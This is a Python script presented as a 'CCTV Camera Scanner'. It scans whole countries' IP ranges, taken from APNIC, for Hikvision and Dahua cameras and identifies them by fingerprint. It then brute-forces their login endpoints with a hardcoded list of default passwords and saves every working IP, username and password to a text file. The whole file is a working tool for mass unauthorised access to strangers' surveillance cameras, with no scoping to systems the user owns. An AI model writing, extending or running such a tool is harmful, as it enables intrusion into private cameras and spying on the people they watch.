import socket
import base64
import time
import sys
import ipaddress
import os
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import requests
from requests.auth import HTTPDigestAuth
import urllib3
from datetime import datetime
import math

# Get script directory for relative file paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# APNIC URL for fetching IP ranges
APNIC_URL = "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest"

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Try to import colorama for colored output
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[91m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        MAGENTA = '\033[95m'
    class Style:
        RESET_ALL = '\033[0m'

# Default credentials to try
DEFAULT_CREDENTIALS = [
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin12345"),
    ("admin", "admin1122"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
]

# Supported Countries
COUNTRIES = {
    '1': {'name': 'Afghanistan', 'code': 'AF', 'file': 'AF_IP.txt'},
    '2': {'name': 'Australia', 'code': 'AU', 'file': 'AU_IP.txt'},
    '3': {'name': 'Bangladesh', 'code': 'BD', 'file': 'BD_IP.txt'},
    '4': {'name': 'Brunei', 'code': 'BN', 'file': 'BN_IP.txt'},
    '5': {'name': 'Bhutan', 'code': 'BT', 'file': 'BT_IP.txt'},
    '6': {'name': 'China', 'code': 'CN', 'file': 'CN_IP.txt'},
    '7': {'name': 'Cook Islands', 'code': 'CK', 'file': 'CK_IP.txt'},
    '8': {'name': 'Fiji', 'code': 'FJ', 'file': 'FJ_IP.txt'},
    '9': {'name': 'Micronesia', 'code': 'FM', 'file': 'FM_IP.txt'},
    '10': {'name': 'Guam', 'code': 'GU', 'file': 'GU_IP.txt'},
    '11': {'name': 'Hong Kong', 'code': 'HK', 'file': 'HK_IP.txt'},
    '12': {'name': 'Indonesia', 'code': 'ID', 'file': 'ID_IP.txt'},
    '13': {'name': 'India', 'code': 'IN', 'file': 'IN_IP.txt'},
    '14': {'name': 'Japan', 'code': 'JP', 'file': 'JP_IP.txt'},
    '15': {'name': 'Cambodia', 'code': 'KH', 'file': 'KH_IP.txt'},
    '16': {'name': 'Kiribati', 'code': 'KI', 'file': 'KI_IP.txt'},
    '17': {'name': 'South Korea', 'code': 'KR', 'file': 'KR_IP.txt'},
    '18': {'name': 'Sri Lanka', 'code': 'LK', 'file': 'LK_IP.txt'},
    '19': {'name': 'Laos', 'code': 'LA', 'file': 'LA_IP.txt'},
    '20': {'name': 'Myanmar', 'code': 'MM', 'file': 'MM_IP.txt'},
    '21': {'name': 'Mongolia', 'code': 'MN', 'file': 'MN_IP.txt'},
    '22': {'name': 'Macau', 'code': 'MO', 'file': 'MO_IP.txt'},
    '23': {'name': 'Maldives', 'code': 'MV', 'file': 'MV_IP.txt'},
    '24': {'name': 'Malaysia', 'code': 'MY', 'file': 'MY_IP.txt'},
    '25': {'name': 'New Caledonia', 'code': 'NC', 'file': 'NC_IP.txt'},
    '26': {'name': 'Nepal', 'code': 'NP', 'file': 'NP_IP.txt'},
    '27': {'name': 'Nauru', 'code': 'NR', 'file': 'NR_IP.txt'},
    '28': {'name': 'New Zealand', 'code': 'NZ', 'file': 'NZ_IP.txt'},
    '29': {'name': 'French Polynesia', 'code': 'PF', 'file': 'PF_IP.txt'},
    '30': {'name': 'Papua New Guinea', 'code': 'PG', 'file': 'PG_IP.txt'},
    '31': {'name': 'Philippines', 'code': 'PH', 'file': 'PH_IP.txt'},
    '32': {'name': 'Pakistan', 'code': 'PK', 'file': 'PK_IP.txt'},
    '33': {'name': 'North Korea', 'code': 'KP', 'file': 'KP_IP.txt'},
    '34': {'name': 'Palau', 'code': 'PW', 'file': 'PW_IP.txt'},
    '35': {'name': 'Solomon Islands', 'code': 'SB', 'file': 'SB_IP.txt'},
    '36': {'name': 'Singapore', 'code': 'SG', 'file': 'SG_IP.txt'},
    '37': {'name': 'Thailand', 'code': 'TH', 'file': 'TH_IP.txt'},
    '38': {'name': 'Timor-Leste', 'code': 'TL', 'file': 'TL_IP.txt'},
    '39': {'name': 'Tonga', 'code': 'TO', 'file': 'TO_IP.txt'},
    '40': {'name': 'Taiwan', 'code': 'TW', 'file': 'TW_IP.txt'},
    '41': {'name': 'Vanuatu', 'code': 'VU', 'file': 'VU_IP.txt'},
    '42': {'name': 'Vietnam', 'code': 'VN', 'file': 'VN_IP.txt'},
    '43': {'name': 'Samoa', 'code': 'WS', 'file': 'WS_IP.txt'},
    '44': {'name': 'United States (APNIC)', 'code': 'US', 'file': 'US_IP.txt'},
}

# Global variables
results_lock = threading.Lock()
valid_results = []
scanned_count = 0
total_ips = 0
start_time = time.time()
selected_country = None
cctv_output_file = None

# Counters
found_count = 0
rejected_count = 0  
login_success_count = 0
last_status_update = 0
status_update_interval = 0.5  # Update status every 0.5 seconds


def fast_port_scan(ip: str, ports: List[int], timeout: float = 0.15) -> List[int]:
    """Ultra-fast parallel port scanning"""
    open_ports = []
    
    def check_port(port):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                return port
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        return None
    
    with ThreadPoolExecutor(max_workers=len(ports)) as executor:
        results = executor.map(check_port, ports)
        for port in results:
            if port:
                open_ports.append(port)
                if port in [80, 443, 554, 37777]:
                    break
    
    return open_ports


def cidr_to_ip_range(cidr_notation: str) -> List[str]:
    """Convert CIDR notation to IP range list"""
    try:
        ip_str, count_str = cidr_notation.split('/')
        count = int(count_str)
        if count <= 0:
            return []
        prefix_len = 32 - int(math.log2(count))
        network = ipaddress.IPv4Network(f"{ip_str}/{prefix_len}", strict=False)
        return [str(ip) for ip in network.hosts()]
    except Exception:
        return []


def detect_camera_via_http(ip: str, port: int = 80) -> Tuple[bool, str]:
    """Fast camera detection via HTTP response"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
            response = sock.recv(4096).decode(errors='ignore')
            
            if 'HTTP' in response:
                if '<title>WEB SERVICE</title>' in response or 'web service' in response.lower():
                    return True, "Anjhua-Dahua Technology Camera"
                elif 'login.asp' in response.lower() or '/isapi/' in response.lower() or 'hikvision' in response.lower():
                    return True, "HIK Vision Camera"
            return False, ""
    except:
        return False, ""


class HikvisionCameraValidator:
    def __init__(self, ip_address: str, username: str, password: str, port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.5
    
    def validate(self) -> Tuple[bool, str]:
        try:
            url = f"http://{self.ip_address}:{self.port}/ISAPI/System/deviceInfo"
            response = requests.get(
                url,
                auth=HTTPDigestAuth(self.username, self.password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            if response.status_code == 200:
                return True, "Authentication successful"
            return False, "Authentication failed"
        except:
            return False, "Connection failed"


class DahuaCameraValidator:
    def __init__(self, ip_address: str, username: str, password: str, port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.5
    
    def validate(self) -> Tuple[bool, str]:
        try:
            url = f"http://{self.ip_address}:{self.port}/cgi-bin/magicBox.cgi?action=getDeviceType"
            response = requests.get(
                url,
                timeout=self.timeout,
                verify=False,
                auth=HTTPDigestAuth(self.username, self.password),
                allow_redirects=False
            )
            if response.status_code == 200:
                return True, "Authentication successful"
            return False, "Authentication failed"
        except:
            return False, "Connection failed"


def update_status():
    """Update the status line with current counters"""
    global last_status_update
    current_time = time.time()
    if current_time - last_status_update >= status_update_interval:
        with results_lock:
            current = scanned_count
            total = total_ips
            found = found_count
            rejected = rejected_count
            login_success = login_success_count
        
        # Clear line and show compact status
        sys.stdout.write('\r')
        sys.stdout.write(f"{Fore.CYAN}[*] Progress: {current}/{total} | Found: {Fore.GREEN}{found}{Fore.CYAN} | Rejected: {Fore.RED}{rejected}{Fore.CYAN} | Login: {Fore.GREEN}{login_success}{Fore.CYAN}      ")
        sys.stdout.flush()
        last_status_update = current_time


def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
    """Fast camera detection only"""
    global scanned_count, found_count, rejected_count, cctv_output_file
    
    try:
        open_ports = fast_port_scan(ip, ports, timeout=0.15)
        
        if not open_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            update_status()
            return None
        
        camera_ports = [p for p in open_ports if p in [80, 443, 554, 37777, 8000, 8080]]
        if not camera_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            update_status()
            return None
        
        detected_port = camera_ports[0]
        camera_found, camera_type = detect_camera_via_http(ip, detected_port)
        
        if not camera_found and len(camera_ports) > 1:
            for port in camera_ports[1:]:
                camera_found, camera_type = detect_camera_via_http(ip, port)
                if camera_found:
                    detected_port = port
                    break
        
        if not camera_found:
            if detected_port in [37777, 554]:
                camera_type = "Anjhua-Dahua Technology Camera"
                camera_found = True
        
        if camera_found and camera_type and camera_type not in ["", "Unknown", "Unknown Camera"]:
            url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
            detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            if cctv_output_file:
                try:
                    with open(cctv_output_file, 'a', encoding='utf-8') as file:
                        file.write(f"{'='*60}\n")
                        file.write(f"Camera Type: {camera_type}\n")
                        file.write(f"IP Address: {ip}\n")
                        file.write(f"Port: {detected_port}\n")
                        file.write(f"URL: {url}\n")
                        file.write(f"Detection Time: {detection_time}\n")
                        file.write(f"{'='*60}\n\n")
                        file.flush()
                except:
                    pass
            
            with results_lock:
                scanned_count += 1
                found_count += 1
            
            # Clear status line and show found result
            sys.stdout.write('\r' + ' ' * 100 + '\r')
            print(f"{Fore.GREEN}✓ Found: {ip}:{detected_port} - {camera_type}{Style.RESET_ALL}")
            update_status()
            
            return {
                'ip': ip,
                'camera_type': camera_type,
                'port': detected_port,
                'url': url,
                'open_ports': open_ports
            }
        
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        update_status()
        return None
        
    except Exception:
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        update_status()
        return None


def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], ports: List[int]) -> Optional[dict]:
    """Scan with login attempt"""
    global scanned_count, found_count, rejected_count, login_success_count, cctv_output_file
    
    try:
        open_ports = fast_port_scan(ip, ports, timeout=0.15)
        
        if not open_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            update_status()
            return None
        
        camera_ports = [p for p in open_ports if p in [80, 443, 554, 37777, 8000, 8080]]
        if not camera_ports:
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            update_status()
            return None
        
        detected_port = camera_ports[0]
        camera_found, camera_type = detect_camera_via_http(ip, detected_port)
        
        if not camera_found and len(camera_ports) > 1:
            for port in camera_ports[1:]:
                camera_found, camera_type = detect_camera_via_http(ip, port)
                if camera_found:
                    detected_port = port
                    break
        
        if not camera_found:
            if detected_port in [37777, 554]:
                camera_type = "Anjhua-Dahua Technology Camera"
                camera_found = True
            elif detected_port in [80, 443, 8000, 8080]:
                camera_found = True
        
        if camera_found:
            url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
            detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            is_dahua = (camera_type and ("Dahua" in camera_type or "Anjhua" in camera_type)) or detected_port in [37777, 554]
            
            for username, password in credentials:
                if is_dahua:
                    validator = DahuaCameraValidator(ip, username, password, detected_port)
                else:
                    validator = HikvisionCameraValidator(ip, username, password, detected_port)
                
                success, message = validator.validate()
                if success:
                    if not camera_type or camera_type in ["", "Unknown", "Unknown Camera"]:
                        camera_type = "Anjhua-Dahua Technology Camera" if is_dahua else "HIK Vision Camera"
                    
                    if cctv_output_file:
                        try:
                            with open(cctv_output_file, 'a', encoding='utf-8') as file:
                                file.write(f"{'='*60}\n")
                                file.write(f"Camera Type: {camera_type}\n")
                                file.write(f"IP Address: {ip}\n")
                                file.write(f"Port: {detected_port}\n")
                                file.write(f"URL: {url}\n")
                                file.write(f"Username: {username}\n")
                                file.write(f"Password: {password}\n")
                                file.write(f"Detection Time: {detection_time}\n")
                                file.write(f"{'='*60}\n\n")
                                file.flush()
                        except:
                            pass
                    
                    with results_lock:
                        scanned_count += 1
                        found_count += 1
                        login_success_count += 1
                        valid_results.append({
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'camera_type': camera_type,
                            'port': detected_port,
                            'message': message,
                            'open_ports': open_ports,
                            'url': url
                        })
                    
                    # Clear status line and show success
                    sys.stdout.write('\r' + ' ' * 100 + '\r')
                    print(f"{Fore.GREEN}✓ LOGIN SUCCESS: {ip}:{detected_port} - {username}:{password} ({camera_type}){Style.RESET_ALL}")
                    update_status()
                    
                    return {
                        'ip': ip,
                        'username': username,
                        'password': password,
                        'camera_type': camera_type,
                        'port': detected_port,
                        'message': message,
                        'open_ports': open_ports,
                        'url': url
                    }
                
                # Try other validator as fallback
                if is_dahua:
                    validator = HikvisionCameraValidator(ip, username, password, detected_port)
                else:
                    validator = DahuaCameraValidator(ip, username, password, detected_port)
                
                success, message = validator.validate()
                if success:
                    camera_type = "HIK Vision Camera" if is_dahua else "Anjhua-Dahua Technology Camera"
                    
                    if cctv_output_file:
                        try:
                            with open(cctv_output_file, 'a', encoding='utf-8') as file:
                                file.write(f"{'='*60}\n")
                                file.write(f"Camera Type: {camera_type}\n")
                                file.write(f"IP Address: {ip}\n")
                                file.write(f"Port: {detected_port}\n")
                                file.write(f"URL: {url}\n")
                                file.write(f"Username: {username}\n")
                                file.write(f"Password: {password}\n")
                                file.write(f"Detection Time: {detection_time}\n")
                                file.write(f"{'='*60}\n\n")
                                file.flush()
                        except:
                            pass
                    
                    with results_lock:
                        scanned_count += 1
                        found_count += 1
                        login_success_count += 1
                        valid_results.append({
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'camera_type': camera_type,
                            'port': detected_port,
                            'message': message,
                            'open_ports': open_ports,
                            'url': url
                        })
                    
                    sys.stdout.write('\r' + ' ' * 100 + '\r')
                    print(f"{Fore.GREEN}✓ LOGIN SUCCESS: {ip}:{detected_port} - {username}:{password} ({camera_type}){Style.RESET_ALL}")
                    update_status()
                    
                    return {
                        'ip': ip,
                        'username': username,
                        'password': password,
                        'camera_type': camera_type,
                        'port': detected_port,
                        'message': message,
                        'open_ports': open_ports,
                        'url': url
                    }
            
            # Camera found but no valid credentials
            with results_lock:
                scanned_count += 1
                rejected_count += 1
            update_status()
            return None
        
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        update_status()
        return None
        
    except Exception:
        with results_lock:
            scanned_count += 1
            rejected_count += 1
        update_status()
        return None


def print_country_menu():
    """Display country selection menu"""
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Select Country (Total: {len(COUNTRIES)} Countries):{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    countries_list = list(COUNTRIES.items())
    rows = (len(countries_list) + 2) // 3
    
    for i in range(rows):
        row_str = ""
        for col in range(3):
            idx = i + (col * rows)
            if idx < len(countries_list):
                country = countries_list[idx]
                col_str = f"{Fore.YELLOW}{country[0]:2s}.{Style.RESET_ALL} {country[1]['name']:<22}"
                row_str += col_str
        print(f"  {row_str}")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def fetch_country_ipv4_from_apnic(country_code: str) -> List[str]:
    """Fetch IPv4 ranges from APNIC"""
    ipv4_list = []
    if not country_code:
        return []
    
    try:
        print(f"{Fore.YELLOW}[*] Fetching IP ranges for {country_code} from APNIC...{Style.RESET_ALL}")
        response = requests.get(APNIC_URL, timeout=60, stream=True)
        response.raise_for_status()
        
        for line_bytes in response.iter_lines(decode_unicode=True):
            line = line_bytes.strip() if isinstance(line_bytes, str) else line_bytes.decode('utf-8', errors='ignore').strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('|')
            if len(parts) >= 7 and parts[1].upper() == country_code.upper() and parts[2].lower() == 'ipv4':
                start_ip = parts[3]
                count = int(parts[4])
                ipv4_list.append(f"{start_ip}/{count}")
        
        print(f"{Fore.GREEN}[✓] Found {len(ipv4_list)} IPv4 ranges{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return ipv4_list


def save_ip_ranges_to_file(ipv4_list: List[str], file_path: str) -> bool:
    """Save IPv4 ranges to file"""
    if not ipv4_list:
        return False
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(ipv4_list))
        print(f"{Fore.GREEN}[✓] Saved {len(ipv4_list)} ranges to {file_path}{Style.RESET_ALL}")
        return True
    except:
        return False


def load_country_ip_ranges(country_file: str, country_code: str = None, auto_fetch: bool = True) -> List[str]:
    """Load IP ranges from file or fetch from APNIC"""
    try:
        script_path = os.path.join(SCRIPT_DIR, country_file)
        current_path = os.path.abspath(country_file)
        
        file_path = None
        if os.path.exists(script_path):
            file_path = script_path
        elif os.path.exists(current_path):
            file_path = current_path
        elif os.path.exists(country_file):
            file_path = country_file
        
        if not file_path and auto_fetch and country_code:
            print(f"{Fore.YELLOW}[!] File not found, fetching from APNIC...{Style.RESET_ALL}")
            ipv4_list = fetch_country_ipv4_from_apnic(country_code)
            if ipv4_list:
                file_path = script_path
                save_ip_ranges_to_file(ipv4_list, file_path)
                return ipv4_list
            return []
        
        if not file_path:
            print(f"{Fore.RED}[!] File not found: {country_file}{Style.RESET_ALL}")
            return []
        
        with open(file_path, 'r', encoding='utf-8') as f:
            ranges = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}[✓] Loaded {len(ranges)} IP ranges from {country_file}{Style.RESET_ALL}")
        return ranges
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return []


def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
    """Phase 1: Fast camera detection only"""
    global total_ips, scanned_count, found_count, rejected_count, start_time, cctv_output_file
    
    found_count = 0
    rejected_count = 0
    
    country_file = country['file']
    cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Scanning: {country['name']} ({country['code']}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
    if not ip_ranges:
        print(f"{Fore.RED}[!] No IP ranges loaded{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}[*] Converting IP ranges...{Style.RESET_ALL}")
    ip_list = []
    for idx, cidr_range in enumerate(ip_ranges, 1):
        ips = cidr_to_ip_range(cidr_range)
        ip_list.extend(ips)
        if idx % 100 == 0:
            print(f"\r{Fore.CYAN}[*] Processed {idx}/{len(ip_ranges)} ranges{Style.RESET_ALL}", end='', flush=True)
    
    print(f"\n{Fore.GREEN}[✓] Total IPs: {len(ip_list)}{Style.RESET_ALL}\n")
    
    if not ip_list:
        return
    
    total_ips = len(ip_list)
    ports_to_scan = [80, 8080]
    
    if max_workers is None:
        try:
            cpu_count = os.cpu_count() or 4
            max_workers = min(cpu_count * 10, 500)
        except:
            max_workers = 300
    
    print(f"{Fore.CYAN}[*] Scanning {total_ips} IPs with {max_workers} threads{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Mode: Detection Only{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    scanned_count = 0
    
    try:
        if os.path.exists(cctv_output_file):
            os.remove(cctv_output_file)
    except:
        pass
    
    # Show initial status
    update_status()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {
            executor.submit(scan_single_ip_detection_only, ip, ports_to_scan): ip 
            for ip in ip_list
        }
        
        for future in as_completed(future_to_ip):
            try:
                future.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    
    # Final summary
    print(f"\n\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"    Total IPs scanned: {Fore.YELLOW}{scanned_count}{Style.RESET_ALL}")
    print(f"    Cameras Found: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
    print(f"    Rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
    print(f"    Time: {Fore.YELLOW}{elapsed:.2f}s{Style.RESET_ALL}")
    if elapsed > 0:
        print(f"    Speed: {Fore.YELLOW}{scanned_count/elapsed:.1f} IP/s{Style.RESET_ALL}")
    print(f"    Output: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_workers: int = None):
    """Scan with login attempts"""
    global total_ips, scanned_count, found_count, rejected_count, login_success_count, start_time, cctv_output_file
    
    found_count = 0
    rejected_count = 0
    login_success_count = 0
    
    country_file = country['file']
    cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Scanning: {country['name']} ({country['code']}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
    if not ip_ranges:
        print(f"{Fore.RED}[!] No IP ranges loaded{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}[*] Converting IP ranges...{Style.RESET_ALL}")
    ip_list = []
    for idx, cidr_range in enumerate(ip_ranges, 1):
        ips = cidr_to_ip_range(cidr_range)
        ip_list.extend(ips)
        if idx % 100 == 0:
            print(f"\r{Fore.CYAN}[*] Processed {idx}/{len(ip_ranges)} ranges{Style.RESET_ALL}", end='', flush=True)
    
    print(f"\n{Fore.GREEN}[✓] Total IPs: {len(ip_list)}{Style.RESET_ALL}\n")
    
    if not ip_list:
        return
    
    total_ips = len(ip_list)
    ports_to_scan = [80, 8080]
    
    if max_workers is None:
        try:
            cpu_count = os.cpu_count() or 4
            max_workers = min(cpu_count * 10, 500)
        except:
            max_workers = 300
    
    print(f"{Fore.CYAN}[*] Scanning {total_ips} IPs with {max_workers} threads{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Mode: Detection + Login{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    scanned_count = 0
    
    try:
        if os.path.exists(cctv_output_file):
            os.remove(cctv_output_file)
    except:
        pass
    
    update_status()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {
            executor.submit(scan_single_ip_with_detection, ip, credentials, ports_to_scan): ip 
            for ip in ip_list
        }
        
        for future in as_completed(future_to_ip):
            try:
                future.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    
    print(f"\n\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"    Total IPs scanned: {Fore.YELLOW}{scanned_count}{Style.RESET_ALL}")
    print(f"    Cameras Found: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
    print(f"    Login Success: {Fore.GREEN}{login_success_count}{Style.RESET_ALL}")
    print(f"    Rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
    print(f"    Time: {Fore.YELLOW}{elapsed:.2f}s{Style.RESET_ALL}")
    if elapsed > 0:
        print(f"    Speed: {Fore.YELLOW}{scanned_count/elapsed:.1f} IP/s{Style.RESET_ALL}")
    print(f"    Output: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text if response.status_code == 200 else "Unknown"
    except:
        return "Unknown"


def get_country(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown')
        return "Unknown"
    except:
        return "Unknown"


def print_banner():
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}        CCTV Camera Scanner - Hikvision & Dahua/Anjhua{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Developed by: {Fore.YELLOW}Charlie{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Supports: {Fore.YELLOW}Hikvision & Dahua/Anjhua Cameras{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def main():
    global start_time, scanned_count, total_ips, valid_results
    
    print_banner()
    
    try:
        public_ip = get_public_ip()
        country = get_country(public_ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Your IP: {Fore.YELLOW}{public_ip}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Country: {Fore.YELLOW}{country}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Time: {Fore.YELLOW}{timestamp}{Style.RESET_ALL}")
    except:
        pass
    
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Main Menu:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Random Camera Scan")
    print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Login Check from Saved TXT File")
    print(f"{Fore.YELLOW}3.{Style.RESET_ALL} IP Range Scan")
    print(f"{Fore.YELLOW}4.{Style.RESET_ALL} View All Valid Camera")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.GREEN}Enter your choice (1-4):{Style.RESET_ALL} ").strip()
    
    if choice == '1':
        print_country_menu()
        
        while True:
            country_choice = input(f"{Fore.GREEN}Enter country number (1-{len(COUNTRIES)}):{Style.RESET_ALL} ").strip()
            
            if country_choice in COUNTRIES:
                selected_country = COUNTRIES[country_choice]
                print(f"\n{Fore.GREEN}[✓] Selected: {Fore.YELLOW}{selected_country['name']}{Style.RESET_ALL}")
                
                print(f"{Fore.CYAN}[*] Select scan mode:{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}1.{Style.RESET_ALL} Detection Only (Fast)")
                print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} Detection + Login Attempt")
                
                mode_choice = input(f"{Fore.GREEN}Enter mode (1-2):{Style.RESET_ALL} ").strip()
                
                if mode_choice == '2':
                    scan_country_cameras(selected_country, DEFAULT_CREDENTIALS)
                else:
                    scan_country_cameras_detection_only(selected_country)
                break
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
    
    else:
        print(f"{Fore.YELLOW}[*] Feature coming soon{Style.RESET_ALL}")
    
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
